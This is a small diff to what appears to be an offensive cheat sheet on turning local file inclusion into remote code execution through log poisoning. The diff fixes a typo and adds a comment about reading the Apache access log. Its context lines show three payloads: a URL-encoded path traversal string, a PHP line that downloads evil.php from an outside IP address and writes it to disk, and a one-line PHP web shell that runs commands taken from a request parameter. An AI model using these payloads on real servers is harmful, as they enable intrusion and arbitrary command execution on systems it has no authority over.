@@ -17,7 +17,8 @@ http://[URL]/?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%
 
 ## LFI to RCE - Log Poisoning
 ```
-# Modift user agent
+# Modify user agent
+# Read /var/log/apache2/access.log
 <?php file_put_contents('evil.php', file_get_contents('http://[IP_ADDR]/evil.php'))?>
 <?php echo exec($_GET[cmd]) ; ?>
 ```
